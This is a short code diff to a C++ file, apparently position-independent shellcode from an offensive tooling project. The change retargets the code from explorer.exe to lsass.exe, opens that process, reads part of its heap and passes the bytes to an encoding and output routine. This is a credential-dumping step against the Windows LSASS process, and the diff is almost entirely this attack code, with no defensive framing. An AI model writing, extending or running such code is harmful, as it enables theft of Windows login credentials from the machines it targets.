@@ -6,39 +6,26 @@
 #include <libc/stdlib.h>
 #include <modules/utils/utils.h>
 
-void print_message() {
-    auto ctx = GET_CONTEXT();
-    utils::message(ctx->message, "Main");
-}
-
 extern "C" void main_pic() {
-    auto ctx = GET_CONTEXT();
-
-    wchar_t proc[] = L"explorer.exe";
+    wchar_t proc[] = L"lsass.exe";
     uint64_t pid = utils::get_pid_by_name(proc);
     if (pid == -1) {
-        ctx->message = "Get pid failed!";
-        print_message();
+        utils::message("Get pid failed!", "main error");
         return;
     }
 
     HANDLE h = utils::open_process_by_pid(pid);
     if (h == NULL) {
-        ctx->message = "Unable to open proc!";
-        print_message();
+        utils::message("Unable to open proc!", "main error");
         return;
     }
 
-    size_t bufferSize;
+    size_t bufferSize = 1024;
     char buffer[bufferSize];
-    bool readOk = utils::read_data_section(h, &buffer, bufferSize);
+    bool readOk = utils::read_process_heap(h, &buffer, bufferSize);
     if (!readOk) {
-        ctx->message = "Read data section failed!";
-        print_message();
+        utils::message("Read process heap failed!", "main error");
         return;
     }
-
-    buffer[64] = 0; // null terminate
-    ctx->message = buffer;
-    print_message();
+    utils::message_encode(buffer, bufferSize, "heap");
 }
